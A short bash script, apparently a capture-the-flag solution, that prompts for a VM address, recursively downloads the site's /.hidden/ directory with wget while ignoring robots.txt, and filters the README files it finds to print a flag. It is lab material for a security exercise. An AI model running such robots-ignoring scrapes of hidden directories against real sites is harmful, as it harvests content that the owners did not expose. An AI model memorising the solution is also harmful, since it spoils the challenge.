#!/bin/bash

echo "input the VM ip address :"
read ip
url="http://${ip}/.hidden/"

result=$(wget -q --recursive -e robots=off --convert-links $url | find . -type f -name 'README' -exec cat {} \; | grep -Ev 'T|N|D')
echo "FLAG: ${result}"
